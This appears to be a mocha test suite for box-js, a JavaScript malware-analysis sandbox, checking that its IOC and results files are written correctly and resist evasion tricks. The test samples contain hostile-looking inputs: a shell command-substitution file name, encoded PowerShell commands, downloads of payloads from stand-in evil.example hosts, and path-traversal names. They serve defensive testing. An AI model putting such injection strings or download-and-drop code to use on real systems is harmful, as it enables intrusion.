/* eslint-env mocha */

// snippets.json and resources.json are maps keyed by file name (the snippet's or the
// dropped resource's uuid name in the results dir). simpleStringify used to coerce every
// object to an array by numeric index, so both were written as lists of nulls, and
// resources.json was written BEFORE the new resource was recorded, so it always lagged
// one entry behind. These run box-js end to end and read the files back.

const assert = require("assert");
const {execFileSync} = require("child_process");
const fs = require("fs");
const os = require("os");
const path = require("path");

const boxDir = path.join(__dirname, "..");

function runSample(source) {
	const work = fs.mkdtempSync(path.join(os.tmpdir(), "boxjs-index-"));
	const sample = path.join(work, "sample.js");
	fs.writeFileSync(sample, source);
	execFileSync(process.execPath, [path.join(boxDir, "run.js"), sample, `--output-dir=${work}`], {
		cwd: work,
		stdio: "ignore",
		timeout: 60000,
	});
	const results = path.join(work, "sample.js.results");
	const read = (name) => JSON.parse(fs.readFileSync(path.join(results, name), "utf8"));
	return {work, results, read};
}

function dropResource(text, target) {
	return `var s = new ActiveXObject("ADODB.Stream"); s.Open(); s.Type = 2;
s.WriteText(${JSON.stringify(text)}); s.SaveToFile(${JSON.stringify(target)}, 2); s.Close();\n`;
}

describe("results index files", function() {
	this.timeout(90000);
	let run;
	before(function() {
		run = runSample(
			"var x = new ActiveXObject(\"MSXML2.XMLHTTP\");\n" +
			"x.open(\"GET\", \"http://example.invalid/stage2.bin\", false); x.send();\n" +
			dropResource("first", "C:\\Users\\Public\\a.txt") +
			dropResource("second", "C:\\Users\\Public\\b.txt")
		);
	});
	after(function() {
		fs.rmSync(run.work, {recursive: true, force: true});
	});

	it("writes snippets.json as an object keyed by snippet file name", function() {
		const snippets = run.read("snippets.json");
		assert.ok(snippets && typeof snippets === "object" && !Array.isArray(snippets),
			`expected an object, got ${JSON.stringify(snippets)}`);
		const names = Object.keys(snippets);
		assert.ok(names.length >= 1, "no snippets recorded");
		for (const name of names) {
			assert.ok(snippets[name] && typeof snippets[name].as === "string",
				`snippet ${name} has no 'as': ${JSON.stringify(snippets[name])}`);
			assert.ok(fs.existsSync(path.join(run.results, name)), `${name} not in results dir`);
		}
	});

	it("writes resources.json keyed by resource name, including the last resource", function() {
		const resources = run.read("resources.json");
		assert.ok(resources && typeof resources === "object" && !Array.isArray(resources),
			`expected an object, got ${JSON.stringify(resources)}`);
		const paths = Object.values(resources).map((r) => r.path).sort();
		assert.deepStrictEqual(paths, ["C:\\Users\\Public\\a.txt", "C:\\Users\\Public\\b.txt"]);
		for (const [name, res] of Object.entries(resources)) {
			assert.ok(fs.existsSync(path.join(run.results, name)), `${name} not in results dir`);
			assert.match(res.sha256, /^[0-9a-f]{64}$/);
		}
	});

	it("still writes arrays (IOC.json, urls.json) as arrays", function() {
		assert.ok(Array.isArray(run.read("IOC.json")));
		assert.deepStrictEqual(run.read("urls.json"), ["http://example.invalid/stage2.bin"]);
	});
});

describe("array index files", function() {
	this.timeout(90000);

	it("keeps every element when one is a function", function() {
		// copyWithoutCircularReferences drops function values, so bounding the copy by the
		// surviving key count cut the LAST element: urls.json lost the real URL.
		const run = runSample(
			"InstallProduct(function(){return 1;});\n" +
			"InstallProduct(\"http://evil.example/payload.exe\");\n"
		);
		try {
			const urls = run.read("urls.json");
			assert.ok(Array.isArray(urls));
			assert.ok(urls.includes("http://evil.example/payload.exe"), JSON.stringify(urls));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("index file hardening", function() {
	this.timeout(90000);

	it("keeps nested arrays as arrays", function() {
		const run = runSample("lib.logIOC(\"Probe\", {args: [\"-nop\", \"-enc\", \"SQBFAFgA\"]}, \"probe\");\n");
		try {
			const probe = run.read("IOC.json").find((e) => e.type === "Probe");
			assert.ok(probe, "no Probe IOC");
			assert.deepStrictEqual(probe.value.args, ["-nop", "-enc", "SQBFAFgA"]);
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("lists only string URLs in urls.json, String objects included", function() {
		const run = runSample(
			"InstallProduct(function(){return 1;});\n" +
			"InstallProduct(\"http://first.example/a.exe\");\n" +
			"InstallProduct(new String(\" http://second.example/b.exe \"));\n"
		);
		try {
			assert.deepStrictEqual(run.read("urls.json"),
				["http://first.example/a.exe", "http://second.example/b.exe"]);
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("does not pass a resource name through a shell", function() {
		const run = runSample("lib.logResource(\"$(touch${IFS}PWNED_file_cmd)\", \"C:\\\\x.txt\", \"hello\");\n");
		try {
			// runSample runs box-js in run.work, where an injected `touch` would land.
			assert.ok(!fs.existsSync(path.join(run.work, "PWNED_file_cmd")), "command substitution ran");
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("sparse arrays", function() {
	this.timeout(90000);

	it("does not materialize a huge sparse array", function() {
		const run = runSample("var a = []; a[4294967294] = \"x\"; lib.logSnippet(\"s.js\", {as: a}, \"\");\n");
		try {
			assert.deepStrictEqual(run.read("snippets.json")["s.js"], {as: {"4294967294": "x"}});
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("hostile names and shapes", function() {
	this.timeout(90000);

	it("keeps a non-string URL out of latestUrl", function() {
		const run = runSample(
			"InstallProduct(\"http://x.example/a.exe\");\n" +
			"InstallProduct(function(){return 1;});\n" +
			"lib.logResource(\"r1\", \"C:\\\\x.txt\", \"hello\");\n"
		);
		try {
			assert.strictEqual(run.read("resources.json").r1.latestUrl, "http://x.example/a.exe");
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("records a resource and a snippet named __proto__", function() {
		const run = runSample(
			"lib.logResource(\"__proto__\", \"C:\\\\hidden.txt\", \"hello\");\n" +
			"lib.logSnippet(\"__proto__\", {as: \"x\"}, \"\");\n"
		);
		try {
			const resources = run.read("resources.json");
			assert.ok(Object.prototype.hasOwnProperty.call(resources, "__proto__"), JSON.stringify(resources));
			const snippets = run.read("snippets.json");
			assert.ok(Object.prototype.hasOwnProperty.call(snippets, "__proto__"), JSON.stringify(snippets));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("keeps trailing slots and extra array properties", function() {
		const run = runSample(
			"lib.logIOC(\"Trail\", {args: [\"a\", function(){}]}, \"t\");\n" +
			"var a = []; a[2] = \"z\"; a.p = 1; a.q = 2;\n" +
			"lib.logIOC(\"Extra\", {v: a}, \"e\");\n"
		);
		try {
			const iocs = run.read("IOC.json");
			assert.deepStrictEqual(iocs.find((e) => e.type === "Trail").value.args, ["a", null]);
			assert.deepStrictEqual(iocs.find((e) => e.type === "Extra").value.v, {"2": "z", p: 1, q: 2});
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("sample-chosen file names", function() {
	this.timeout(90000);

	it("cannot overwrite an index file or leave the results dir", function() {
		const run = runSample(
			"lib.logResource(\"resources.json\", \"C:\\\\a.exe\", \"MZpayload\");\n" +
			"lib.logResource(\"../escaped.txt\", \"C:\\\\b.txt\", \"out\");\n" +
			"lib.logSnippet(\"IOC.json\", {as: \"x\"}, \"clobber\");\n"
		);
		try {
			const resources = run.read("resources.json");
			assert.ok(!Array.isArray(resources) && typeof resources === "object");
			const paths = Object.values(resources).map((r) => r.path).sort();
			assert.deepStrictEqual(paths, ["C:\\a.exe", "C:\\b.txt"]);
			assert.ok(!fs.existsSync(path.join(run.work, "escaped.txt")), "wrote outside the results dir");
			assert.ok(Array.isArray(run.read("IOC.json")), "IOC.json clobbered");
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("survives a String whose toStringTag getter throws, and an unprintable URL", function() {
		const run = runSample(
			"var u = new String(\"http://evil.example/p\");\n" +
			"Object.defineProperty(u, Symbol.toStringTag, {get: function(){ throw new Error(\"stop\"); }});\n" +
			"InstallProduct(u);\n" +
			"InstallProduct({toString: function(){ throw new Error(\"boom\"); }});\n" +
			"InstallProduct(\"http://after.example/q\");\n"
		);
		try {
			assert.ok(run.read("urls.json").includes("http://after.example/q"));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("what reaches IOC.json, urls.json and env_vars.json", function() {
	this.timeout(90000);

	it("does not take document.location reads as URLs", function() {
		const run = runSample(
			"var x = new ActiveXObject(\"MSXML2.XMLHTTP\");\n" +
			"x.open(\"GET\", \"http://evil.example/stage2.exe\", false); x.send();\n" +
			"var h = document.location.hostname; var r = document.location.href;\n" +
			"lib.logResource(\"r1\", \"C:\\\\x.txt\", \"hello\");\n"
		);
		try {
			assert.deepStrictEqual(run.read("urls.json"), ["http://evil.example/stage2.exe"]);
			assert.strictEqual(run.read("resources.json").r1.latestUrl, "http://evil.example/stage2.exe");
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("writes String-object URLs in IOC values as strings", function() {
		const run = runSample(
			"var x = new ActiveXObject(\"MSXML2.XMLHTTP\");\n" +
			"x.open(\"GET\", new String(\"http://evil.example/strobj.exe\"), false); x.send();\n"
		);
		try {
			const xhr = run.read("IOC.json").find((e) => e.type === "XMLHTTP");
			assert.strictEqual(xhr.value.url, "http://evil.example/strobj.exe");
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("keeps writing IOC.json after an unserializable or very deep value", function() {
		const run = runSample(
			"function nest(n) { var o = {}; for (var i = 0; i < n; i++) o = {c: o}; return o; }\n" +
			"lib.logIOC(\"Deep\", nest(2400), \"deep\");\n" +
			"lib.logIOC(\"Big\", {v: BigInt(7)}, \"big\");\n" +
			"lib.logIOC(\"After\", {ok: 1}, \"after\");\n"
		);
		try {
			const types = run.read("IOC.json").map((e) => e.type);
			assert.ok(types.includes("After"), JSON.stringify(types));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("records an environment variable named __proto__", function() {
		const run = runSample(
			"var env = new ActiveXObject(\"WScript.Shell\").Environment(\"Process\");\n" +
			"env.rvalAssign(\"__proto__\", \"C:\\\\stage.ps1\"); env.rvalAssign(\"PAYLOAD\", \"x\");\n"
		);
		try {
			const vars = run.read("env_vars.json");
			assert.ok(Object.prototype.hasOwnProperty.call(vars, "__proto__"), JSON.stringify(vars));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("forged and unserializable values", function() {
	this.timeout(90000);

	it("serializes a BigInt in snippet metadata and keeps going", function() {
		const run = runSample(
			"lib.logSnippet(\"s.js\", {as: BigInt(7)}, \"\");\n" +
			"lib.logIOC(\"After\", {ok: 1}, \"after\");\n"
		);
		try {
			assert.deepStrictEqual(run.read("snippets.json")["s.js"], {as: "7"});
			assert.ok(run.read("IOC.json").some((e) => e.type === "After"));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("does not collapse an object that forges a String toStringTag", function() {
		const run = runSample(
			"var h = {Authorization: \"Bearer secret\"}; h[Symbol.toStringTag] = \"String\";\n" +
			"lib.logIOC(\"Forged\", {headers: h}, \"forged\");\n"
		);
		try {
			const e = run.read("IOC.json").find((x) => x.type === "Forged");
			assert.deepStrictEqual(e.value.headers, {Authorization: "Bearer secret"});
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("String objects and IOC snapshots", function() {
	this.timeout(90000);

	it("records a String object's real URL, not its own valueOf", function() {
		const run = runSample(
			"var u = new String(\"http://real.example/payload.exe\");\n" +
			"u.valueOf = function () { return \"http://decoy.example/benign.txt\"; };\n" +
			"InstallProduct(u);\n"
		);
		try {
			assert.deepStrictEqual(run.read("urls.json"), ["http://real.example/payload.exe"]);
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("keeps the fields of an object built on String.prototype", function() {
		const run = runSample(
			"var c = Object.create(String.prototype); c.valueOf = function () { return \"y\"; };\n" +
			"c.Authorization = \"Bearer secret\";\n" +
			"lib.logIOC(\"Forged\", {headers: c}, \"forged\");\n"
		);
		try {
			const e = run.read("IOC.json").find((x) => x.type === "Forged");
			assert.deepStrictEqual(e.value.headers, {Authorization: "Bearer secret"});
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("never replaces a later IOC because an earlier value turned bad", function() {
		const run = runSample(
			"var n = 0; var g = {}; Object.defineProperty(g, \"v\", {enumerable: true,\n" +
			"  get: function () { if (n++ > 1) throw null; return 1; }});\n" +
			"lib.logIOC(\"G\", g, \"g\");\n" +
			"lib.logIOC(\"Later\", {cmd: \"powershell -nop -enc SQBFAFgA\"}, \"later\");\n" +
			"lib.logIOC(\"Last\", {ok: 1}, \"last\");\n"
		);
		try {
			const iocs = run.read("IOC.json");
			assert.deepStrictEqual(iocs.find((x) => x.type === "Later").value, {cmd: "powershell -nop -enc SQBFAFgA"});
			assert.ok(iocs.some((x) => x.type === "Last"));
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("lib surface and name aliases", function() {
	this.timeout(90000);

	it("does not let the sample register a String verifier", function() {
		const run = runSample(
			"if (lib.registerSandboxStringValueOf) lib.registerSandboxStringValueOf(function () { return \"http://decoy.example/\"; });\n" +
			"var o = {k: 1}; o[Symbol.toStringTag] = \"String\";\n" +
			"InstallProduct(o); InstallProduct(\"http://real.example/a\");\n"
		);
		try {
			assert.deepStrictEqual(run.read("urls.json"), ["http://real.example/a"]);
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("takes a String object with its own toStringTag as a URL", function() {
		const run = runSample(
			"var u = new String(\"http://evil.example/p\"); u[Symbol.toStringTag] = \"URL\";\n" +
			"InstallProduct(u);\n"
		);
		try {
			assert.deepStrictEqual(run.read("urls.json"), ["http://evil.example/p"]);
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("refuses case and trailing-dot aliases of index files", function() {
		const run = runSample(
			"lib.logSnippet(\"ioc.json\", {as: \"x\"}, \"clobber\");\n" +
			"lib.logSnippet(\"IOC.json.\", {as: \"x\"}, \"clobber\");\n" +
			"lib.logSnippet(\"harrington.json\", {as: \"x\"}, \"clobber\");\n" +
			"lib.logSnippet(\"NUL.txt\", {as: \"x\"}, \"clobber\");\n"
		);
		try {
			const names = Object.keys(run.read("snippets.json"));
			for (const bad of ["ioc.json", "IOC.json.", "harrington.json", "NUL.txt"]) {
				assert.ok(!names.includes(bad), JSON.stringify(names));
			}
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("dedupes decode IOCs without re-reading a logged value", function() {
		const run = runSample(
			"var n = 0; var v = {}; Object.defineProperty(v, \"out\", {enumerable: true,\n" +
			"  get: function () { if (n++ > 1) throw new Error(\"later boom\"); return \"first\"; }});\n" +
			"lib.logIOC(\"decodeURI\", v, \"d1\");\n" +
			"lib.logIOC(\"decodeURI\", {out: \"second\"}, \"d2\");\n"
		);
		try {
			const outs = run.read("IOC.json").filter((e) => e.type === "decodeURI").map((e) => e.value.out);
			assert.deepStrictEqual(outs, ["first", "second"]);
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("String objects at the top level, and a patched Function.prototype.call", function() {
	this.timeout(90000);

	it("writes a top-level String-object or BigInt IOC value as a string", function() {
		const run = runSample(
			"lib.logIOC(\"TopStr\", new String(\"powershell -nop -enc SQBFAFgA\"), \"t\");\n" +
			"lib.logIOC(\"TopBig\", BigInt(7), \"b\");\n"
		);
		try {
			const iocs = run.read("IOC.json");
			assert.strictEqual(iocs.find((e) => e.type === "TopStr").value, "powershell -nop -enc SQBFAFgA");
			assert.strictEqual(iocs.find((e) => e.type === "TopBig").value, "7");
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});

	it("is not steered by a patched Function.prototype.call", function() {
		const run = runSample(
			"var FP = Object.getPrototypeOf(function () {});\n" +
			"FP.call = function () { return \"http://decoy.example/benign.txt\"; };\n" +
			"InstallProduct(new String(\"http://real.example/payload.exe\"));\n" +
			"lib.logIOC(\"Headers\", {headers: {Authorization: \"Bearer secret\"}}, \"h\");\n"
		);
		try {
			assert.deepStrictEqual(run.read("urls.json"), ["http://real.example/payload.exe"]);
			const h = run.read("IOC.json").find((e) => e.type === "Headers");
			assert.deepStrictEqual(h.value, {headers: {Authorization: "Bearer secret"}});
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("decode IOC out", function() {
	this.timeout(90000);

	it("reads out once, for both the record and the dedupe", function() {
		const run = runSample(
			"var n = 0; var v = {}; Object.defineProperty(v, \"out\", {enumerable: true,\n" +
			"  get: function () { return n++ ? \"second\" : \"first\"; }});\n" +
			"lib.logIOC(\"decodeURI\", v, \"d1\");\n" +
			"lib.logIOC(\"decodeURI\", {out: \"second\"}, \"d2\");\n"
		);
		try {
			const outs = run.read("IOC.json").filter((e) => e.type === "decodeURI").map((e) => e.value.out);
			assert.deepStrictEqual(outs, ["first", "second"]);
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("fallback VM String capture", function() {
	this.timeout(90000);

	it("ignores a String global planted before the no-rewrite fallback", function() {
		const run = runSample(fs.readFileSync(path.join(__dirname, "fixtures", "fallback-plant.js"), "utf8"));
		try {
			assert.deepStrictEqual(run.read("urls.json"), ["http://evil.example/gate.php"]);
			const res = Object.values(run.read("resources.json"));
			assert.deepStrictEqual(res.map((r) => r.path), ["C:\\Users\\Public\\a.exe"]);
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("index maps survive an unserializable entry", function() {
	this.timeout(90000);

	it("keeps rewriting resources.json and snippets.json", function() {
		const run = runSample(
			"var p = {}; Object.defineProperty(p, \"x\", {enumerable: true, get: function () { throw new Error(\"no\"); }});\n" +
			"try { lib.logResource(\"bad\", p, \"x\"); } catch (e) {}\n" +
			"try { lib.logSnippet(\"bads\", {as: p}, \"x\"); } catch (e) {}\n" +
			"lib.logResource(\"good\", \"C:\\\\payload.exe\", \"MZ\");\n" +
			"lib.logSnippet(\"goods\", {as: \"x\"}, \"y\");\n"
		);
		try {
			assert.strictEqual(run.read("resources.json").good.path, "C:\\payload.exe");
			assert.deepStrictEqual(run.read("snippets.json").goods, {as: "x"});
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});

describe("string-realms registrar", function() {
	it("can be claimed only once", function() {
		const realms = require("../string-realms");
		// analyze.js claims it at load; in this process nothing has, so claim it here.
		realms.claimRegistrar();
		assert.throws(() => realms.claimRegistrar(), /already claimed/);
	});

	it("is already claimed when the sample's host require reaches it", function() {
		const run = runSample(
			"var ok = \"no-require\";\n" +
			"try { require(\"./string-realms\").claimRegistrar(); ok = \"claimed\"; } catch (e) { ok = String(e.message); }\n" +
			"lib.logIOC(\"Claim\", {result: ok}, \"c\");\n"
		);
		try {
			const r = run.read("IOC.json").find((e) => e.type === "Claim").value.result;
			assert.notStrictEqual(r, "claimed");
		} finally {
			fs.rmSync(run.work, {recursive: true, force: true});
		}
	});
});
